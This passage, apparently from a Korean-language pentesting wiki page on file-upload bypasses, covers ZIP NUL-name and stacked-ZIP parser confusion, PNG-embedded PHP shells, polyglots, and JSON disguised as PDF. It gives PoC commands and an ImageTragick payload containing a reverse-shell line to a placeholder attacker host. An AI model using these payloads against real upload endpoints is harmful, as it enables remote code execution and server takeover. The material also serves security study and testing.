# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Notes
- 파일명은 반드시 로컬과 central directory의 두 곳 모두 변경하세요. 일부 도구는 추가 data descriptor entry를 더 생성하므로 – 존재하면 모든 name 필드를 조정하세요.
- 페이로드 파일은 여전히 server‑side magic/MIME sniffing을 통과해야 합니다. PHP를 PDF 스트림에 임베드하면 헤더를 유효하게 유지할 수 있습니다.
- enum/validation 경로와 extraction/write 경로가 문자열 처리에서 불일치하는 경우에 동작합니다.

### Stacked/concatenated ZIPs (파서 불일치)

두 개의 유효한 ZIP 파일을 연결하면 서로 다른 파서가 서로 다른 EOCD 레코드를 참조하는 blob이 생성됩니다. 많은 도구는 마지막 End Of Central Directory (EOCD)를 찾는 반면, 일부 라이브러리(예: 특정 워크플로에서 ZipArchive)는 먼저 발견한 아카이브를 파싱할 수 있습니다. 검증이 첫 번째 아카이브를 열거(enumerate)하고 추출이 마지막 EOCD를 존중하는 다른 도구를 사용할 경우, 정상적인 아카이브는 검사를 통과하지만 악성 아카이브가 추출될 수 있습니다.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
악용 패턴
- 허용된 유형(예: PDF)의 정상적인 아카이브 하나를 만들고, 차단된 확장자를 포함한 두 번째 아카이브(예: `shell.php`)를 만듭니다.
- 이들을 이어붙입니다: `cat benign.zip evil.zip > combined.zip`.
- 서버가 한 파서로 유효성 검사를 수행해 (benign.zip을 확인)하지만 다른 파서로 추출해 (evil.zip을 처리)하면 차단된 파일이 추출 경로에 놓이게 됩니다.

## ImageTragic

이 내용을 이미지 확장자로 업로드하여 취약점 **(ImageMagick , 7.0.1-1)**을 악용하세요 ([exploit](https://www.exploit-db.com/exploits/39767)에서)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP Shell 임베딩

PNG 파일의 IDAT chunk에 PHP shell을 삽입하면 특정 이미지 처리 작업을 우회할 수 있습니다. PHP-GD의 `imagecopyresized`와 `imagecopyresampled` 함수는 각각 이미지 크기 조정 및 리샘플링에 흔히 사용되며, 이와 관련해 특히 중요합니다. 삽입된 PHP shell이 이러한 작업에 영향을 받지 않고 남아있는 능력은 특정 상황에서 큰 장점입니다.

이 기술의 방법론과 적용 가능성에 대한 자세한 설명은 다음 글에서 확인할 수 있습니다: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/).

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## 폴리글롯 파일

폴리글롯 파일은 여러 파일 포맷을 동시에 유효하게 만족하는 카멜레온과 같은 도구입니다. 흥미로운 예로는 GIF와 RAR 아카이브를 동시에 수행하는 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있습니다. 이와 같은 파일은 GIF와 JS, 또는 PPT와 JS 같은 조합으로도 만들 수 있습니다.

폴리글롯 파일의 핵심 유용성은 파일 타입으로 파일을 필터링하는 보안 조치를 우회할 수 있다는 점에 있습니다. 많은 애플리케이션에서는 잠재적으로 위험한 포맷(JS, PHP, Phar 등)을 차단하기 위해 JPEG, GIF, DOC 같은 특정 파일 타입만 업로드를 허용하는 경우가 일반적입니다. 그러나 폴리글롯은 여러 파일 포맷의 구조적 요건을 동시에 만족함으로써 이러한 제한을 은밀히 통과할 수 있습니다.

다만 폴리글롯에도 제한점은 존재합니다. 예를 들어 PHAR 파일(PHp ARchive)과 JPEG를 동시에 만족하는 폴리글롯이 있더라도, 플랫폼이 파일 확장자 정책을 엄격히 적용하는 경우 구조적 이중성만으로는 업로드가 허용되지 않을 수 있습니다.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF처럼 가장해 유효한 JSON 업로드하기

허용되지 않은 경우에도 PDF로 가장하여 유효한 JSON 파일을 업로드해 파일 타입 탐지를 회피하는 방법 (기술은 **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** 에서 참조):

- **`mmmagic` library**: `%PDF` 매직 바이트가 처음 1024바이트 안에 있으면 유효하다고 판단함 (예제는 포스트 참조)
- **`pdflib` library**: JSON의 필드 안에 가짜 PDF 형식을 추가해 라이브러리가 이를 PDF로 인식하게 만듦 (예제는 포스트 참조)
- **`file` binary**: 파일에서 최대 1048576 바이트까지 읽음. 따라서 JSON을 그보다 크게 만들어 `file`이 JSON으로 파싱하지 못하게 한 뒤, JSON 내부에 실제 PDF의 초기 부분을 넣으면 PDF로 인식함

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
